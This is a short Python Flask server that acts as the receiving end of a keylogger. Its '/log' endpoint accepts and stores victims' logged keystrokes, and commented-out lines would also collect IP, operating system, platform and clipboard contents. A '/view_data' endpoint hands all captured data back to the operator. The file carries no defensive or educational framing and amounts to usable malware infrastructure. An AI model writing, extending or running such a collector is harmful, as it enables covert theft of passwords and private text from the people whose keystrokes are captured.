from flask import Flask, jsonify, request

app = Flask(__name__) 

dummy = []

@app.route('/log', methods = ['POST'])
def home():
    data = {
        #"network_info": request.json['ip'],
        #"os_name": request.json['os'],
        #"platform": request.json['platform'],
        #"clipboard": request.json['clipboard'],
        "logged-keys": request.json['keys']
    }
    dummy.append(data)
    return data

@app.route('/view_data', methods = ['GET'])
def view():
    return dummy

if __name__ == "__main__":
    app.run(debug=True, port=8080)